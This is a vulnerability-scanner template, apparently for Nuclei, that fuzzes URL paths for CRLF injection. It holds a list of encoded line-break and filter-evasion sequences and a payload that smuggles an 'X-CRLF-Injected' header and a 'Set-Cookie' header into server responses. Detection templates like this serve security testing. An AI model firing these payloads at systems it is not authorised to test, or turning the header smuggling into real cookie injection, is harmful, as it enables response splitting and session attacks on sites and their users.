id: crlf-path

info:
  name: CRLF Injection - Path Based (Strict)
  author: reewardius
  severity: medium
  tags: fuzzing-req,fuzzing-req-crlf,fuzzing-req-path,dast,crlf
  
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
        condition: and
      
    payloads:
      escape:
        - "%00"
        - "%09%0A"
        - "%09%0D"
        - "%09%0D%0A"
        - "%0a"
        - "%0a%20"
        - "%0d"
        - "%0d%09"
        - "%0d%0a"
        - "%0d%0a%09"
        - "%0d%0a%20"
        - "%0d%20"
        - "%20"
        - "%20%0a"
        - "%20%0d"
        - "%20%0d%0a"
        - "%23%0a"
        - "%23%0a%20"
        - "%23%0d"
        - "%23%0d%0a"
        - "%23%oa"
        - "%25%30"
        - "%25%30%61"
        - "%2e%2e%2f%0d%0a"
        - "%2f%2e%2e%0d%0a"
        - "%2f..%0d%0a"
        - "%3f"
        - "%3f%0a"
        - "%3f%0d"
        - "%3f%0d%0a"
        - "%C0%8D%C0%8A"
        - "%C4%8A"
        - "%C4%8D%C4%8A"
        - "%EA%A8%8A"
        - "%EA%A8%8D"
        - "%EA%A8%8D%EA%A8%8A"
        - "%e5%98%8a%e5%98%8d"
        - "%e5%98%8a%e5%98%8d%0a"
        - "%e5%98%8a%e5%98%8d%0d"
        - "%e5%98%8a%e5%98%8d%0d%0a"
        - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
        - "%u0000"
        - "%u000a"
        - "%u000d"
        - "%u000d%u000a"
        
    fuzzing:
      - part: path
        type: postfix
        mode: single
        fuzz:
          - "{{escape}}X-CRLF-Injected:true{{escape}}Set-Cookie:crlf={{randstr}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?im)^X-CRLF-Injected\s*:\s*true'
          - '(?im)^Set-Cookie\s*:.*crlf='
